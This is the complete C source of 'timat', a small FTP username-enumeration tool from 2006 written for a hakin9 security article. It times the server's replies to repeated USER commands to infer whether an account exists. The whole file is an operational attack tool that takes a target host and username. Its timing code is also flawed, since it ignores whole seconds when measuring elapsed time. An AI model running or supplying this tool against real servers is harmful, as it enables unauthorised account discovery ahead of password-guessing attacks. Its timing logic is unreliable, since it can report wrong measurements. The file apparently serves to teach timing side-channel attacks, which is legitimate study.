/*
  timat v1.0-hakin9 -- timing analysis measurement toolfor ftp servers
  
  Copyright (C) 2006 Stavros Lekkas <xfactor @ linuxmail.org>
                     Thanos Theodorides <attheodo @ inf.uth.gr>
  
  This program has been designed for the purposes of a hakin9 article.
    
  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netdb.h>

#define FTP_PORT 21
#define SIZE 1024
#define CLEAR(x) memset(x, 0x00, sizeof(x))

void usage(char *);
long calc_time(char *);
int timat_connect(char *, int);

int socket_fd;
char rBuf[SIZE];
char wBuf[SIZE];

int main(int argc, char **argv)
{
 int i, r;
 unsigned long sum = 0, n;
 int probe_num;

 if(argc < 4)
    usage(argv[0]);

 if(atoi(argv[3]) < 1)
 {
  fprintf(stderr, "[-] Invalid value.\n");
  exit(-1);
 }

 probe_num = atoi(argv[3]);

 if( (socket_fd = timat_connect(argv[1], FTP_PORT)) == -1 )
 {
  fprintf(stderr, "[-] Cannot connect.\n");
  exit(-1);
 }

 fprintf(stdout, "[+] Response times for user [%s]: ", argv[2]);

 CLEAR(rBuf);
 r = read(socket_fd, rBuf, sizeof(rBuf) - 1);

 for(i = 1; i <= probe_num; i++)
 {
  n = calc_time(argv[2]);
  fprintf(stdout, "[#%d: %d] ", i, n);
  sum += n;
 }

 fprintf(stdout, "\n[+] Average time: %u\n", sum/probe_num);

 close(socket_fd);
 
 return 0;
}

void usage(char *progname)
{
 fprintf(stdout, "\ntimat - Timing Attack Tool for FTP servers\n"
                 "Usage: %s <target_ip> <user_to_probe> <times_to_probe>\n\n",progname);
 exit(0);
}

long calc_time(char *username)
{
 int n;
 struct timeval tvalue1, tvalue2;
 struct timezone tzone1, tzone2;

 CLEAR(wBuf);
 gettimeofday(&tvalue1, &tzone1);
 snprintf(wBuf, sizeof(wBuf) - 1, "USER %s\r\n", username);
 write(socket_fd, wBuf, strlen(wBuf));
 CLEAR(rBuf);
 n = read(socket_fd, rBuf, sizeof(rBuf) - 1);
 gettimeofday(&tvalue2, &tzone2);
 
 return (tvalue2.tv_usec - tvalue1.tv_usec);
}

int timat_connect(char *host, int port)
{
 struct sockaddr_in addr;
 struct hostent *him;

 him = gethostbyname(host);

 if(him == NULL)
    return -1;

 socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

 if(socket_fd == -1)
    return -1;

 memcpy(&(addr.sin_addr), him->h_addr, him->h_length);
 addr.sin_family = AF_INET;
 addr.sin_port = htons(port);

 if( connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) == -1 )
 socket_fd = -1;

 return socket_fd;
}
